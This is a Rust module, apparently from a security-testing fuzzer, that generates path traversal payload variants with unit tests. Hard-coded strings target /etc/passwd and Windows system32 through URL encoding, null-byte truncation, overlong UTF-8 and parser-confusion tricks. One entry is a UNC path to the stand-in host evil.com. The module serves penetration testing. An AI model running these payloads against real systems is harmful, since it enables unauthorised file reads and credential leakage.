//! Path traversal grammar-aware payload mutation.
//!
//! Generates traversal payload variants that preserve the same target-file
//! intent while rotating separator style, encoding form, platform-specific
//! path handling, and parser confusion tricks.
//!
//! # Strategies
//!
//! 1. Single- and double-encoded traversal separators
//! 2. Null-byte file-extension truncation
//! 3. Backslash-substituted Windows traversal
//! 4. Overlong UTF-8 traversal bytes
//! 5. Double-dot parser confusion variants
//! 6. Windows case tricks for sensitive paths
//! 7. UNC network paths
//! 8. `/proc/self/root` escape forms

use std::collections::BTreeSet;

/// Generate semantic-preserving path traversal mutations for a candidate payload.
#[must_use]
pub fn mutate(payload: &str) -> Vec<String> {
    if payload.is_empty() || !detect_type(payload) {
        return Vec::new();
    }

    let mut results = BTreeSet::new();
    let target = infer_target_path(payload);

    for variant in [
        "..%2f..%2f..%2fetc/passwd".to_string(),
        "..%252f..%252f..%252fetc/passwd".to_string(),
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd".to_string(),
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd".to_string(),
        "../../../etc/passwd%00.jpg".to_string(),
        "..\\..\\..\\etc\\passwd".to_string(),
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd".to_string(),
        "....//....//....//etc/passwd".to_string(),
        "..;/..;/..;/etc/passwd".to_string(),
        "..%00/..%00/..%00/etc/passwd".to_string(),
        "..\\..\\WINDOWS\\system32".to_string(),
        "\\\\evil.com\\share".to_string(),
        "/proc/self/root/etc/passwd".to_string(),
    ] {
        results.insert(variant);
    }

    if target.contains("windows") || target.contains("system32") {
        results.insert("..\\..\\WINDOWS\\system32".to_string());
    }

    if target.contains("/etc/passwd") || target.contains("passwd") {
        results.insert(format!("../../../{}", target.trim_start_matches('/')));
        results.insert(format!(
            "..\\..\\..\\{}",
            target.trim_start_matches('/').replace('/', "\\")
        ));
        results.insert(format!(
            "/proc/self/root/{}",
            target.trim_start_matches('/')
        ));
    }

    results.remove(payload);
    results.into_iter().collect()
}

/// Detect whether a payload looks like a path traversal probe.
#[must_use]
pub fn detect_type(payload: &str) -> bool {
    let lower = payload.to_ascii_lowercase();
    let signals = [
        payload.contains("../"),
        payload.contains("..\\"),
        payload.contains('/'),
        payload.contains('\\'),
        lower.contains("/etc/"),
        lower.contains("/proc/"),
        has_file_extension(payload),
    ];

    signals.into_iter().filter(|signal| *signal).count() >= 2
}

fn infer_target_path(payload: &str) -> String {
    let lower = payload.to_ascii_lowercase();
    if lower.contains("windows") || lower.contains("system32") {
        "WINDOWS/system32".to_string()
    } else if let Some(index) = lower.find("/etc/") {
        payload[index..].to_string()
    } else if let Some(index) = lower.find("/proc/") {
        payload[index..].to_string()
    } else if let Some(index) = payload.rfind("..") {
        payload[index..]
            .replace("..", "")
            .trim_start_matches(['/', '\\'])
            .to_string()
    } else {
        "etc/passwd".to_string()
    }
}

fn has_file_extension(payload: &str) -> bool {
    payload.rsplit_once('.').is_some_and(|(_, suffix)| {
        let clean = suffix.trim_matches(|ch: char| !ch.is_ascii_alphanumeric());
        (1..=5).contains(&clean.len())
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_unix_traversal() {
        assert!(detect_type("../../../etc/passwd"));
    }

    #[test]
    fn detects_windows_traversal() {
        assert!(detect_type(
            "..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts"
        ));
    }

    #[test]
    fn rejects_non_path_text() {
        assert!(!detect_type("hello template world"));
    }

    #[test]
    fn generates_encoding_variants() {
        let mutations = mutate("../../../etc/passwd");
        assert!(mutations.iter().any(|item| item.contains("..%2f")));
        assert!(mutations.iter().any(|item| item.contains("..%252f")));
        assert!(mutations.iter().any(|item| item.contains("%2e%2e%2f")));
    }

    #[test]
    fn generates_null_byte_variant() {
        let mutations = mutate("../../../etc/passwd");
        assert!(mutations.iter().any(|item| item.contains("%00.jpg")));
    }

    #[test]
    fn generates_backslash_variant() {
        let mutations = mutate("../../../etc/passwd");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("..\\..\\..\\etc\\passwd"))
        );
    }

    #[test]
    fn generates_overlong_utf8_variant() {
        let mutations = mutate("../../../etc/passwd");
        assert!(mutations.iter().any(|item| item.contains("%c0%ae%c0%ae/")));
    }

    #[test]
    fn generates_double_dot_confusion_variants() {
        let mutations = mutate("../../../etc/passwd");
        assert!(mutations.iter().any(|item| item.contains("....//")));
        assert!(mutations.iter().any(|item| item.contains("..;/")));
        assert!(mutations.iter().any(|item| item.contains("..%00/")));
    }

    #[test]
    fn generates_windows_case_trick() {
        let mutations = mutate("..\\..\\windows\\system32");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("WINDOWS\\system32"))
        );
    }

    #[test]
    fn generates_unc_and_proc_variants() {
        let mutations = mutate("../../../etc/passwd");
        assert!(mutations.iter().any(|item| item == "\\\\evil.com\\share"));
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("/proc/self/root/etc/passwd"))
        );
    }
}
